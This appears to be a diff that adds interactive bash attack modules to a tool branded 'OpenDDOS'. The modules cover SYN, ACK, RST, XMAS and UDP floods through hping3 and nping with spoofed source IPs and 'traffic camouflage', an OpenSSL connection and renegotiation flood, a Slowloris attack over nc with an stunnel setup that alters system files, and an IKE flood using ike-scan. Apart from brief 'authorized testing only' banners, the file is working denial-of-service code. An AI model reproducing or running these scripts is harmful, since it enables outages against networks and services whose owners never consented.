+    local RED='\033[0;31m'
+    local GREEN='\033[0;32m'
+    local YELLOW='\033[1;33m'
+    local BLUE='\033[0;34m'
+    local CYAN='\033[0;36m'
+    local NC='\033[0m'
+
+    # 检查hping3
+    echo -e "${CYAN}[*] Checking for hping3...${NC}"
+    if ! command -v hping3 &> /dev/null; then
+        echo -e "${RED}[!] hping3 not found, fallback to nping${NC}"
+        # nping部分保持不变（略）
+        return
+    fi
+
+    # 目标输入
+    while true; do
+        echo -e -n "${BLUE}[?] Enter target IP/hostname: ${NC}"
+        read -e TARGET
+        [[ -n "$TARGET" ]] && break
+        echo -e "${RED}[!] Target cannot be empty${NC}"
+    done
+
+    # 端口输入验证
+    echo -e -n "${BLUE}[?] Enter target port (default 80): ${NC}"
+    read -e PORT
+    : ${PORT:=80}
+    if ! [[ "$PORT" =~ ^[0-9]+$ ]] || [ "$PORT" -lt 1 ] || [ "$PORT" -gt 65535 ]; then
+        PORT=80
+        echo -e "${YELLOW}[!] Invalid port, using 80${NC}"
+    fi
+
+    # 智能速率控制
+    AUTO_RATE=$(( $(nproc) * 1000 ))  # 根据CPU核心数动态计算
+    echo -e "${CYAN}[*] Auto-calculated rate: ${AUTO_RATE} packets/sec (based on CPU cores)${NC}"
+    echo -e "${GREEN}[1] Use auto-rate (recommended)"
+    echo -e "[2] Set custom rate${NC}"
+    read -p "> [1-2]: " RATE_OPT
+    case $RATE_OPT in
+        2) 
+            echo -e -n "${YELLOW}[?] Enter custom rate (packets/sec): ${NC}"
+            read CUSTOM_RATE
+            [[ "$CUSTOM_RATE" =~ ^[0-9]+$ ]] || CUSTOM_RATE=$AUTO_RATE
+            RATE=$CUSTOM_RATE
+            ;;
+        *) RATE=$AUTO_RATE ;;
+    esac
+
+    # 源IP选择（优化版）
+    echo -e "\n${CYAN}[*] Select source IP mode:${NC}"
+    echo -e "  1) ${GREEN}Interface IP (default)${NC}"
+    echo -e "  2) ${BLUE}Random spoofed IP${NC}"
+    echo -e "  3) ${YELLOW}Custom IP range (CIDR)${NC}"
+    read -p "> [1-3]: " SRC_OPT
+
+    # 流量伪装参数
+    TTL=64
+    WIN_SIZE=$(shuf -i 5120-65535 -n 1)  # 随机窗口大小
+    SEQ_OFFSET=$((RANDOM % 1000))        # 随机序列号偏移
+
+    # 主攻击逻辑
+    case $SRC_OPT in
+        2)
+            CMD="sudo hping3 -S --flood -p $PORT --rand-source --ttl $TTL --win $WIN_SIZE --setseq $SEQ_OFFSET --frag --data 0 $TARGET"
+            echo -e "${BLUE}[*] Using random spoofed IP with traffic camouflage${NC}"
+            ;;
+        3)
+            echo -e -n "${YELLOW}[?] Enter CIDR range (e.g. 192.168.1.0/24): ${NC}"
+            read CIDR
+            if [[ "$CIDR" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}/[0-9]{1,2}$ ]]; then
+                CMD="sudo hping3 -S --flood -p $PORT --spoof $CIDR --ttl $TTL --win $WIN_SIZE --setseq $SEQ_OFFSET --frag --data 0 $TARGET"
+                echo -e "${GREEN}[*] Using CIDR range ${CIDR} with traffic camouflage${NC}"
+            else
+                echo -e "${RED}[!] Invalid CIDR, using random IPs${NC}"
+                CMD="sudo hping3 -S --flood -p $PORT --rand-source --ttl $TTL --win $WIN_SIZE --setseq $SEQ_OFFSET --frag --data 0 $TARGET"
+            fi
+            ;;
+        *)
+            CMD="sudo hping3 -S --flood -p $PORT --ttl $TTL --win $WIN_SIZE --setseq $SEQ_OFFSET --frag --data 0 $TARGET"
+            echo -e "${GREEN}[*] Using interface IP with traffic camouflage${NC}"
+            ;;
+    esac
+
+    # 速率限制
+    CMD="$CMD --fast --interval $((1000000/RATE))"  # 转换为微秒间隔
+
+    # 最终确认
+    echo -e "\n${YELLOW}[!] Final command preview:${NC}"
+    echo -e "$CMD"
+    echo -e "\n${RED}[!] WARNING: This will generate ${RATE} packets/sec to ${TARGET}:${PORT}${NC}"
+    read -p "[*] Press Enter to launch or Ctrl+C to abort"
+
+    # 执行攻击
+    eval $CMD
+}
+##END TCPSYNFLOOD##
+###################
+
+#####################
+##START TCPACKFLOOD##
+ackflood() {
+    # 颜色定义
+    local RED='\033[0;31m'
+    local GREEN='\033[0;32m'
+    local YELLOW='\033[1;33m'
+    local BLUE='\033[0;34m'
+    local NC='\033[0m'
+
+    # 检查hping3
+    echo -e "${BLUE}[*] Checking for hping3...${NC}"
+    if ! command -v hping3 &> /dev/null; then
+        echo -e "${RED}[!] hping3 not found, fallback to nping (limited functionality)${NC}"
+        # 此处可添加nping备用方案
+        return 1
+    fi
+
+    # 目标输入验证
+    while true; do
+        echo -e -n "${GREEN}[?] Enter target IP/hostname: ${NC}"
+        read -e TARGET
+        [[ -n "$TARGET" ]] && break
+        echo -e "${RED}[!] Target cannot be empty${NC}"
+    done
+
+    # 端口输入验证
+    echo -e -n "${GREEN}[?] Enter target port (default 80): ${NC}"
+    read -e PORT
+    : ${PORT:=80}
+    if ! [[ "$PORT" =~ ^[0-9]+$ ]] || [ "$PORT" -lt 1 ] || [ "$PORT" -gt 65535 ]; then
+        PORT=80
+        echo -e "${YELLOW}[!] Invalid port, using 80${NC}"
+    fi
+
+    # 智能速率控制
+    AUTO_RATE=$(( $(nproc) * 800 ))  # 比SYN Flood保守的速率
+    echo -e "${BLUE}[*] Auto-calculated rate: ${AUTO_RATE} packets/sec (CPU cores × 800)${NC}"
+    echo -e "${GREEN}[1] Use auto-rate (recommended)"
+    echo -e "[2] Set custom rate${NC}"
+    read -p "> [1-2]: " RATE_OPT
+    case $RATE_OPT in
+        2)
+            echo -e -n "${YELLOW}[?] Enter custom rate (packets/sec): ${NC}"
+            read CUSTOM_RATE
+            [[ "$CUSTOM_RATE" =~ ^[0-9]+$ ]] || CUSTOM_RATE=$AUTO_RATE
+            RATE=$CUSTOM_RATE
+            ;;
+        *) RATE=$AUTO_RATE ;;
+    esac
+
+    # 流量伪装参数
+    TTL=64
+    WIN_SIZE=$(shuf -i 5120-65535 -n 1)  # 随机窗口大小
+    ID_OFFSET=$((RANDOM % 10000))        # 随机IP ID偏移
+
+    # 源IP模式选择
+    echo -e "\n${BLUE}[*] Select source IP mode:${NC}"
+    echo -e "  1) ${GREEN}Interface IP (default)${NC}"
+    echo -e "  2) ${YELLOW}Random spoofed IP${NC}"
+    echo -e "  3) ${BLUE}Custom IP range (CIDR)${NC}"
+    read -p "> [1-3]: " SRC_OPT
+
+    # 构建攻击命令
+    case $SRC_OPT in
+        2)
+            CMD="sudo hping3 --flood -A -p $PORT --rand-source --ttl $TTL --win $WIN_SIZE --id $ID_OFFSET --data 0"
+            echo -e "${YELLOW}[*] Using random spoofed IP with traffic camouflage${NC}"
+            ;;
+        3)
+            echo -e -n "${BLUE}[?] Enter CIDR range (e.g. 192.168.1.0/24): ${NC}"
+            read CIDR
+            if [[ "$CIDR" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}/[0-9]{1,2}$ ]]; then
+                CMD="sudo hping3 --flood -A -p $PORT --spoof $CIDR --ttl $TTL --win $WIN_SIZE --id $ID_OFFSET --data 0"
+                echo -e "${GREEN}[*] Using CIDR range ${CIDR}${NC}"
+            else
+                echo -e "${RED}[!] Invalid CIDR, using random IPs${NC}"
+                CMD="sudo hping3 --flood -A -p $PORT --rand-source --ttl $TTL --win $WIN_SIZE --id $ID_OFFSET --data 0"
+            fi
+            ;;
+        *)
+            CMD="sudo hping3 --flood -A -p $PORT --ttl $TTL --win $WIN_SIZE --id $ID_OFFSET --data 0"
+            echo -e "${GREEN}[*] Using interface IP${NC}"
+            ;;
+    esac
+
+    # 添加速率控制和目标
+    CMD="$CMD --fast --interval $((1000000/RATE)) $TARGET"
+
+    # 最终确认
+    echo -e "\n${YELLOW}[!] Final command preview:${NC}"
+    echo -e "$CMD"
+    echo -e "\n${RED}[!] WARNING: This will generate ${RATE} ACK packets/sec to ${TARGET}:${PORT}${NC}"
+    read -p "[*] Press Enter to launch or Ctrl+C to abort"
+
+    # 执行攻击
+    eval $CMD
+}
+##END TCPACKFLOOD##
+###################
+
+#####################
+##START TCPRSTFLOOD##
+
+rstflood() {
+    # Color definitions
+    local RED='\033[0;31m'
+    local GREEN='\033[0;32m'
+    local YELLOW='\033[1;33m'
+    local BLUE='\033[0;34m'
+    local NC='\033[0m'
+
+    # Root check
+    if [ "$EUID" -ne 0 ]; then
+        echo -e "${RED}[!] Requires root privileges${NC}"
+        exit 1
+    fi
+
+    # Dependency check
+    check_deps() {
+        local tools=("hping3" "nping")
+        for tool in "${tools[@]}"; do
+            if ! command -v "$tool" &>/dev/null; then
+                echo -e "${RED}[!] Missing dependency: $tool${NC}"
+                return 1
+            fi
+        done
+        return 0
+    }
+    check_deps || exit 1
+
+    # Target validation
+    validate_target() {
+        if [[ "$1" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
+            if ! ping -c 1 -W 2 "$1" &>/dev/null; then
+                echo -e "${YELLOW}[!] Target blocks ping but IP format is valid${NC}"
+            fi
+        elif ! host "$1" &>/dev/null; then
+            echo -e "${RED}[!] Target unreachable and DNS resolution failed${NC}"
+            return 1
+        fi
+        return 0
+    }
+
+    # Port validation
+    validate_port() {
+        if ! [[ "$1" =~ ^[0-9]+$ ]] || [ "$1" -lt 1 ] || [ "$1" -gt 65535 ]; then
+            echo -e "${YELLOW}[!] Invalid port, using default 80${NC}"
+            return 1
+        fi
+        return 0
+    }
+
+    # User input
+    get_input() {
+        echo -e -n "${GREEN}[?] Target IP/Hostname: ${NC}"
+        read -e TARGET
+        validate_target "$TARGET" || exit 1
+
+        echo -e -n "${GREEN}[?] Target port (default 80): ${NC}"
+        read -e PORT
+        : ${PORT:=80}
+        validate_port "$PORT" || PORT=80
+
+        echo -e -n "${GREEN}[?] Source IP ([r]andom/[i]nterface IP/custom IP): ${NC}"
+        read -e SOURCE
+        : ${SOURCE:=i}
+
+        echo -e -n "${GREEN}[?] Attach data? [y/n] (default n): ${NC}"
+        read -e SENDDATA
+        : ${SENDDATA:=n}
+
+        if [[ "$SENDDATA" = "y" ]]; then
+            echo -e -n "${GREEN}[?] Data size in bytes (default 3000): ${NC}"
+            read -e DATA
+            : ${DATA:=3000}
+            [[ "$DATA" =~ ^[0-9]+$ ]] || DATA=3000
+        else
+            DATA=0
+        fi
+    }
+
+    # Attack execution
+    launch_attack() {
+        # Build command string for preview
+        local CMD="sudo hping3 --flood -d $DATA --frag -p $PORT -R $TARGET"
+        case "$SOURCE" in
+            r) CMD+=" --rand-source" ;;
+            i) : ;; # Use default interface IP
+            *) [[ "$SOURCE" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] && CMD+=" --spoof $SOURCE" || SOURCE="i" ;;
+        esac
+
+        # Final confirmation
+        echo -e "\n${YELLOW}[!] Final command preview:${NC}"
+        echo -e "$CMD"
+        echo -e "\n${RED}[!] WARNING: This will send continuous RST packets to ${TARGET}:${PORT}${NC}"
+        read -p "[*] Press Enter to launch or Ctrl+C to abort"
+
+        # Execute without suppressing output
+        eval "$CMD" &
+
+        # Cleanup handler
+        trap "killall hping3 2>/dev/null; exit 0" INT
+        wait
+    }
+
+    # Main flow
+    get_input
+    echo -e "\n${YELLOW}[!] Attack configuration:"
+    echo -e "  Target: ${TARGET}:${PORT}"
+    echo -e "  Source IP: ${SOURCE}"
+    echo -e "  Data size: ${DATA} bytes${NC}"
+    
+    launch_attack
+}
+
+
+
+##END TCPRSTFLOOD##
+###################
+
+#####################
+##START TCPXMASFLOOD##
+xmasflood() {
+    # 颜色定义
+    local RED='\033[0;31m'
+    local GREEN='\033[0;32m'
+    local YELLOW='\033[1;33m'
+    local BLUE='\033[0;34m'
+    local NC='\033[0m'
+
+    # 法律声明
+    echo -e "\n${RED}[!] 法律声明：未经授权的网络攻击是违法行为！${NC}"
+    echo -e "${YELLOW}此脚本仅限授权测试使用。${NC}"
+    read -p "继续即代表您已获得合法授权 [y/N] " -n 1 -r
+    [[ ! $REPLY =~ ^[Yy]$ ]] && exit 1
+
+    # 检查hping3/nping
+    check_deps() {
+        local tools=("hping3" "nping")
+        for tool in "${tools[@]}"; do
+            if ! command -v "$tool" &>/dev/null; then
+                echo -e "${RED}[!] 缺少依赖: $tool${NC}"
+                return 1
+            fi
+        done
+        return 0
+    }
+
+    # 目标验证
+    validate_target() {
+        if [[ "$1" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
+            if ! ping -c 1 -W 2 "$1" &>/dev/null; then
+                echo -e "${YELLOW}[!] 目标禁止Ping但IP格式有效${NC}"
+            fi
+        elif ! host "$1" &>/dev/null; then
+            echo -e "${RED}[!] 目标不可达且DNS解析失败${NC}"
+            return 1
+        fi
+        return 0
+    }
+
+    # 端口验证
+    validate_port() {
+        [[ "$1" =~ ^[0-9]+$ ]] && (( "$1" > 0 && "$1" < 65536 )) || {
+            echo -e "${YELLOW}[!] 无效端口，使用默认80${NC}"
+            return 1
+        }
+        return 0
+    }
+
+    # 用户输入
+    get_input() {
+        echo -e -n "${GREEN}[?] 目标IP/主机名: ${NC}"
+        read -e TARGET
+        validate_target "$TARGET" || exit 1
+
+        echo -e -n "${GREEN}[?] 目标端口 (默认80): ${NC}"
+        read -e PORT
+        : ${PORT:=80}
+        validate_port "$PORT" || PORT=80
+
+        echo -e -n "${GREEN}[?] 源IP ([r]随机/[i]接口IP/自定义IP): ${NC}"
+        read -e SOURCE
+        : ${SOURCE:=i}
+
+        echo -e -n "${GREEN}[?] 附加数据? [y/n] (默认n): ${NC}"
+        read -e SENDDATA
+        : ${SENDDATA:=n}
+
+        if [[ "$SENDDATA" =~ ^[Yy]$ ]]; then
+            echo -e -n "${GREEN}[?] 数据大小(字节，默认3000): ${NC}"
+            read -e DATA
+            : ${DATA:=3000}
+            [[ "$DATA" =~ ^[0-9]+$ ]] || DATA=3000
+        else
+            DATA=0
+        fi
+
+        echo -e -n "${GREEN}[?] 攻击持续时间(秒，默认60): ${NC}"
+        read -e DURATION
+        : ${DURATION:=60}
+    }
+
+    # 攻击执行
+    launch_attack() {
+        # 命令构建
+        local CMD="sudo timeout $DURATION hping3 --flood -d $DATA -p $PORT "
+        case "$SOURCE" in
+            r) CMD+="--rand-source " ;;
+            i) : ;;
+            *) [[ "$SOURCE" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] && CMD+="--spoof $SOURCE " || SOURCE="i" ;;
+        esac
+        CMD+="-F -S -R -P -A -U -X -Y $TARGET"
+
+        # 最终确认
+        echo -e "\n${YELLOW}[!] 最终命令预览:${NC}"
+        echo -e "$CMD"
+        echo -e "\n${RED}[!] 警告: 将向 ${TARGET}:${PORT} 发送XMAS攻击包${NC}"
+        read -p "按 Enter 确认执行，或 Ctrl+C 取消"
+
+        # 执行攻击
+        eval "$CMD" &
+        trap "killall hping3 2>/dev/null; exit 0" INT TERM
+        wait
+    }
+
+    # 主流程
+    check_deps || exit 1
+    get_input
+
+    echo -e "\n${YELLOW}[!] 攻击配置:"
+    echo -e "  目标: ${TARGET}:${PORT}"
+    echo -e "  源IP: ${SOURCE}"
+    echo -e "  数据大小: ${DATA}字节"
+    echo -e "  持续时间: ${DURATION}秒${NC}"
+
+    launch_attack
+}
+
+##END TCPXMASFLOOD##
+###################
+
+##################
+##START UDPFLOOD##
+udpflood() {
+    # 颜色定义
+    RED='\033[0;31m'
+    GREEN='\033[0;32m'
+    YELLOW='\033[1;33m'
+    BLUE='\033[0;34m'
+    NC='\033[0m' # No Color
+
+    # 工具检测优化
+    detect_tool() {
+        if command -v hping3 >/dev/null 2>&1; then
+            echo "hping3"
+        elif command -v nping >/dev/null 2>&1; then
+            echo "nping"
+        else
+            echo "none"
+        fi
+    }
+
+    # 输入验证函数
+    validate_input() {
+        # 目标IP验证
+        if ! [[ "$TARGET" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] && ! ping -c 1 -W 1 "$TARGET" &>/dev/null; then
+            echo -e "${RED}错误: 无效的目标地址${NC}" >&2
+            return 1
+        fi
+
+        # 端口验证
+        if ! [[ "$PORT" =~ ^[0-9]+$ ]] || [ "$PORT" -lt 1 ] || [ "$PORT" -gt 65535 ]; then
+            echo -e "${YELLOW}警告: 使用默认端口80${NC}"
+            PORT=80
+        fi
+        return 0
+    }
+
+    # 主交互界面
+    echo -e "\n${GREEN}=== UDP Flood 攻击配置 ===${NC}"
+
+    # 工具检测
+    TOOL=$(detect_tool)
+    case $TOOL in
+        hping3) echo -e "${BLUE}检测到 hping3 (最优选择)${NC}" ;;
+        nping) echo -e "${YELLOW}检测到 nping (备用方案)${NC}" ;;
+        *) echo -e "${RED}错误: 未找到hping3或nping${NC}"; return 1 ;;
+    esac
+
+    # 目标配置
+    while true; do
+        read -p "请输入目标IP/域名: " TARGET
+        validate_input && break
+    done
+
+    # 端口配置
+    read -p "目标端口[80]: " PORT
+    : ${PORT:=80}
+    validate_input
+
+    # 数据配置
+    read -p "发送数据(留空随机生成): " DATA
+    if [ -z "$DATA" ]; then
+        DATA=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 32)
+        echo -e "${YELLOW}生成随机数据: ${DATA:0:16}...${NC}"
+    fi
+
+    PS3="OpenDDOS>"
+    options=("接口IP" "随机伪造" "手动输入")
+    select SOURCE_MODE in "${options[@]}"; do
+        case $REPLY in
+            1) SOURCE_OPT="i"; break ;;
+            2) SOURCE_OPT="r"; break ;;
+            3)
+                read -p "输入源IP: " MANUAL_IP
+                if [[ "$MANUAL_IP" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
+                    SOURCE_OPT="m"
+                    break
+                else
+                    echo -e "${RED}无效IP格式${NC}"
+                    continue
+                fi
+                ;;
+            *) echo -e "${RED}无效选项${NC}"; continue ;;
+        esac
+    done
+
+    # 速率配置 (仅nping需要)
+    if [ "$TOOL" = "nping" ]; then
+        read -p "发包速率(pps)[5000]: " RATE
+        : ${RATE:=5000}
+        read -p "总包数[10000]: " TOTAL
+        : ${TOTAL:=10000}
+    fi
+
+    # 执行确认
+    echo -e "\n${RED}=== 攻击摘要 ==="
+    echo -e "工具: $TOOL"
+    echo -e "目标: $TARGET:$PORT"
+    echo -e "数据: ${DATA:0:32}..."
+    echo -e "模式: $SOURCE_MODE${NC}"
+    
+    read -p "确认执行? [y/N] " -n 1 -r
+    [[ ! $REPLY =~ ^[Yy]$ ]] && { echo -e "\n${YELLOW}已取消${NC}"; return; }
+    echo
+
+    # 执行攻击
+    case $TOOL in
+        hping3)
+            CMD="sudo hping3 --flood --udp -p $PORT --sign \"$DATA\""
+            case $SOURCE_OPT in
+                r) CMD+=" --rand-source" ;;
+                m) CMD+=" --spoof $MANUAL_IP" ;;
+                *) ;;
+            esac
+            CMD+=" $TARGET"
+            ;;
+        nping)
+            CMD="sudo nping --udp --dest-port $PORT --data-string \"$DATA\" --rate $RATE -c $TOTAL"
+            [ "$SOURCE_OPT" = "m" ] && CMD+=" -S $MANUAL_IP"
+            CMD+=" $TARGET"
+            ;;
+    esac
+
+    echo -e "${YELLOW}执行: $CMD${NC}\n"
+    eval "$CMD"
+}
+##END UDPFLOOD##
+################
+
+################
+##START SSLDOS##
+ssldos() {
+    # Configuration
+    local CONCURRENT_CONNS=50
+    local DELAY=0.1
+    
+    # UI Colors
+    local RED='\033[0;31m'
+    local GREEN='\033[0;32m'
+    local YELLOW='\033[0;33m'
+    local BLUE='\033[0;34m'
+    local NC='\033[0m' # No Color
+    
+    # Banner
+    clear
+    echo -e "${RED}===================================${NC}"
+    echo -e "${RED}  OpenSSL SSL/TLS DoS Attack Tool  ${NC}"
+    echo -e "${RED}===================================${NC}"
+    echo -e "${YELLOW}Warning: For authorized testing only${NC}\n"
+    
+    # Target input
+    while true; do
+        echo -e "${BLUE}[1/3] Target Information${NC}"
+        read -p "Enter target IP/hostname: " TARGET
+        if [[ -n "$TARGET" ]]; then
+            break
+        else
+            echo -e "${RED}Error: Target cannot be empty${NC}"
+        fi
+    done
+    
+    # Port input
+    while true; do
+        read -p "Enter target port [443]: " PORT
+        : ${PORT:=443}
+        if [[ "$PORT" =~ ^[0-9]+$ ]] && [ "$PORT" -ge 1 ] && [ "$PORT" -le 65535 ]; then
+            break
+        else
+            echo -e "${RED}Invalid port! Must be 1-65535${NC}"
+        fi
+    done
+    
+    # Attack mode selection
+    echo -e "\n${BLUE}[2/3] Attack Mode Selection${NC}"
+    PS3="Choose attack technique (1-3): "
+    options=("Standard Connection Flood" "Client Renegotiation Attack" "Session Resumption Attack")
+    select opt in "${options[@]}"; do
+        case $REPLY in
+            1) ATTACK_CMD="openssl s_client -connect $TARGET:$PORT"; break;;
+            2) ATTACK_CMD="(echo R; sleep 1) | openssl s_client -connect $TARGET:$PORT"; break;;
+            3) ATTACK_CMD="openssl s_client -reconnect -connect $TARGET:$PORT"; break;;
+            *) echo -e "${RED}Invalid option!${NC}";;
+        esac
+    done
+    
+    # Confirmation
+    echo -e "\n${BLUE}[3/3] Attack Summary${NC}"
+    echo -e "Target: ${GREEN}$TARGET${NC}"
+    echo -e "Port: ${GREEN}$PORT${NC}"
+    echo -e "Mode: ${GREEN}$opt${NC}"
+    echo -e "Concurrent: ${GREEN}$CONCURRENT_CONNS${NC}"
+    echo -e "Delay: ${GREEN}$DELAY${NC}"
+    
+    read -p $'\nPress enter to begin attack (Ctrl+C to stop): '
+    
+    # Attack execution
+    echo -e "\n${RED}[!] ATTACK STARTED${NC}"
+    echo -e "${YELLOW}Launching $CONCURRENT_CONNS connections every $DELAY seconds${NC}"
+    echo -e "${YELLOW}Use Ctrl+C to terminate${NC}"
+    
+    trap "echo -e '\n${RED}[!] ATTACK STOPPED${NC}'; killall openssl 2>/dev/null; exit" SIGINT
+    
+    local count=0
+    while true; do
+        for i in $(seq 1 $CONCURRENT_CONNS); do
+            eval "$ATTACK_CMD >/dev/null 2>&1 &"
+            ((count++))
+        done
+        echo -ne "${BLUE}Total connections made: $count\r${NC}"
+        sleep $DELAY
+    done
+}
+##END SSLDOS##
+##############
+
+##################
+##START SLOWLORIS##
+slowloris() {
+    # 颜色定义
+    local RED='\033[0;31m'
+    local GREEN='\033[0;32m'
+    local YELLOW='\033[1;33m'
+    local BLUE='\033[0;34m'
+    local NC='\033[0m'
+
+    # 攻击参数配置
+    echo -e "${GREEN}\n=== Slowloris 攻击模块 ==="
+    echo -e "通过保持大量慢速HTTP连接耗尽目标资源${NC}"
+
+    # 目标设置
+    echo -e "\n${BLUE}[1]${NC} 输入目标地址:"
+    read -p "IP/域名: " -i "$TARGET" -e TARGET
+    [ -z "$TARGET" ] && { echo -e "${RED}错误：必须指定目标${NC}"; return 1; }
+
+    # 端口设置
+    echo -e "\n${BLUE}[2]${NC} 输入目标端口:"
+    read -p "端口 (默认80): " -i "${PORT:-80}" -e PORT
+    : ${PORT:=80}
+    if ! [[ "$PORT" =~ ^[0-9]+$ ]] || [ "$PORT" -lt 1 ] || [ "$PORT" -gt 65535 ]; then
+        echo -e "${RED}无效端口，重置为80${NC}"; PORT=80
+    fi
+
+    # 连接数设置
+    echo -e "\n${BLUE}[3]${NC} 设置并发连接数:"
+    read -p "数量 (默认2000): " -i "${CONNS:-2000}" -e CONNS
+    : ${CONNS:=2000}
+    [ "$CONNS" -gt 10000 ] && echo -e "${YELLOW}警告：过高连接数可能导致系统资源耗尽${NC}"
+
+    # 间隔时间设置
+    echo -e "\n${BLUE}[4]${NC} 设置请求间隔:"
+    echo -e "  ${YELLOW}r${NC}) 随机间隔 (5-15秒)"
+    echo -e "  或输入具体秒数"
+    read -p "选择: " -i "${INTERVAL:-r}" -e INTERVAL
+    : ${INTERVAL:=r}
+    if [[ "$INTERVAL" == "r" ]]; then
+        INTERVAL=$((RANDOM % 11 + 5))
+    elif ! [[ "$INTERVAL" =~ ^[0-9]+$ ]]; then
+        echo -e "${RED}无效输入，使用随机间隔${NC}"
+        INTERVAL=$((RANDOM % 11 + 5))
+    fi
+
+    # SSL隧道设置
+    echo -e "\n${BLUE}[5]${NC} 使用SSL加密? (y/n):"
+    read -p "选择 [n]: " -i "${SSL:-n}" -e SSL
+    : ${SSL:=n}
+
+    if [[ "$SSL" =~ ^[Yy] ]]; then
+        # 集成stunnel功能
+        echo -e "${GREEN}▶ 启用SSL加密${NC}"
+        local LHOST=127.0.0.1 LPORT=9991
+
+        # 检查stunnel服务
+        if ! grep -q "$LPORT" /etc/services 2>/dev/null; then
+            echo "添加OpenDDOS服务到/etc/services"
+            sudo sh -c 'echo "OpenDDOS-stunnel 9991/tcp #OpenDDOS SSL监听" >> /etc/services'
+        fi
+
+        # 配置stunnel
+        sudo mkdir -p /etc/stunnel
+        sudo tee /etc/stunnel/OpenDDOS.conf >/dev/null <<EOF
+[Slowloris-Tunnel]
+client = yes
+accept = $LHOST:$LPORT
+connect = $TARGET:$PORT
+verify = 0
+EOF
+        
+        # 启动stunnel
+        if ! pgrep -f "stunnel.*OpenDDOS.conf" >/dev/null; then
+            sudo stunnel /etc/stunnel/OpenDDOS.conf || {
+                echo -e "${RED}SSL隧道启动失败${NC}"; return 1
+            }
+        fi
+        attack_target="$LHOST:$LPORT"
+    else
+        attack_target="$TARGET:$PORT"
+    fi
+
+    # 执行攻击
+    echo -e "\n${RED}▶ 开始攻击 $attack_target${NC}"
+    echo -e "  连接数: ${CONNS}"
+    echo -e "  间隔: ${INTERVAL}秒"
+    echo -e "${YELLOW}按 Ctrl+C 终止攻击${NC}"
+
+    for ((i=1; i<=CONNS; i++)); do
+        echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\n$RANDOM: $RANDOM\r\n" | \
+        nc -i $INTERVAL -w 30 $attack_target >/dev/null 2>&1 &
+        printf "\r已建立连接: %d/%d" $i $CONNS
+    done
+
+    echo -e "\n\n${GREEN}✔ 攻击启动完成${NC}"
+    echo -e "实际连接数: $(ps aux | grep -c "nc.*$attack_target")"
+}
+##END SLOWLORIS##
+#################
+
+###################
+##START IPSEC DOS##
+ipsecdos() {
+    # Color Definitions
+    RED='\033[0;31m'
+    GREEN='\033[0;32m'
+    YELLOW='\033[1;33m'
+    BLUE='\033[0;34m'
+    CYAN='\033[0;36m'
+    NC='\033[0m' # No Color
+    
+    # Banner
+    clear
+    echo -e "${RED}==================================${NC}"
+    echo -e "${RED}   IPsec VPN DoS Attack Module    ${NC}"
+    echo -e "${RED}==================================${NC}"
+    echo -e "${YELLOW}Warning: For authorized testing only${NC}\n"
+    
+    # Target Input
+    while true; do
+        read -p "$(echo -e "${BLUE}Enter target IP/hostname: ${NC}")" TARGET
+        if [[ -n "$TARGET" ]]; then
+            break
+        else
+            echo -e "${RED}Target cannot be empty!${NC}"
+        fi
+    done
+    
+    # Attack Parameters
+    echo -e "\n${CYAN}=== Attack Parameters ==="
+    echo -e "1. Default Mode (Random source IPs)"
+    echo -e "2. Custom Source IP Range"
+    echo -e "3. High-Intensity Mode${NC}"
+    
+    read -p "$(echo -e "${BLUE}Select mode [1-3]: ${NC}")" MODE
+    : ${MODE:=1}
+    
+    case $MODE in
+        2)
+            read -p "$(echo -e "${BLUE}Enter source IP range (e.g., 192.168.1.1-192.168.1.254): ${NC}")" IPRANGE
+            SOURCE_OPT="--sourceip=$IPRANGE"
+            ;;
+        3)
+            INTENSITY="-B 500M -t 5"
+            echo -e "${YELLOW}Warning: High intensity may affect your network${NC}"
+            ;;
+        *)
+            SOURCE_OPT="--sourceip=random"
+            INTENSITY="-B 100M -t 1"
+            ;;
+    esac
+    
+    # Protocol Selection
+    echo -e "\n${CYAN}=== Protocol Options ==="
+    echo -e "1. IKEv1 Aggressive Mode (Default)"
+    echo -e "2. IKEv1 Main Mode"
+    echo -e "3. IKEv2${NC}"
+    
+    read -p "$(echo -e "${BLUE}Select protocol [1-3]: ${NC}")" PROTOCOL
+    : ${PROTOCOL:=1}
+    
+    case $PROTOCOL in
+        2)
+            IKE_OPT=""
+            ;;
+        3)
+            IKE_OPT="-2"
+            ;;
+        *)
+            IKE_OPT="-A"
+            ;;
+    esac
+    
+    # Duration Setting
+    read -p "$(echo -e "${BLUE}Enter duration in minutes (0=infinite) [0]: ${NC}")" DURATION
+    : ${DURATION:=0}
+    
+    # Summary
+    echo -e "\n${CYAN}=== Attack Summary ==="
+    echo -e "Target: ${GREEN}$TARGET${NC}"
+    echo -e "Mode: ${GREEN}$([ "$MODE" == "2" ] && echo "Custom IP Range" || [ "$MODE" == "3" ] && echo "High-Intensity" || echo "Default")${NC}"
+    echo -e "Protocol: ${GREEN}$([ "$PROTOCOL" == "2" ] && echo "IKEv1 Main" || [ "$PROTOCOL" == "3" ] && echo "IKEv2" || echo "IKEv1 Aggressive")${NC}"
+    echo -e "Duration: ${GREEN}$([ "$DURATION" == "0" ] && echo "Infinite" || echo "$DURATION minutes")${NC}${NC}"
+    
+    # Confirmation
+    read -p "$(echo -e "\n${RED}Press enter to launch attack (Ctrl+C to abort)...${NC}")"
+    
+    # Attack Execution
+    echo -e "\n${RED}[!] ATTACK STARTED${NC}"
+    echo -e "${YELLOW}Target: $TARGET"
+    echo -e "Press Ctrl+C to stop${NC}\n"
+    
+    if [ "$DURATION" -gt "0" ]; then
+        END_TIME=$((SECONDS + DURATION * 60))
+        while [ $SECONDS -lt $END_TIME ]; do
+            sudo ike-scan $IKE_OPT $INTENSITY $SOURCE_OPT $TARGET 2>/dev/null
+            sudo ike-scan -q $INTENSITY $SOURCE_OPT $TARGET 2>/dev/null
+        done
+    else
+        while :; do
+            sudo ike-scan $IKE_OPT $INTENSITY $SOURCE_OPT $TARGET 2>/dev/null
+            sudo ike-scan -q $INTENSITY $SOURCE_OPT $TARGET 2>/dev/null
+        done
+    fi
+    
+    echo -e "\n${GREEN}[+] Attack completed${NC}"
+}
+##END IPSEC DOS##
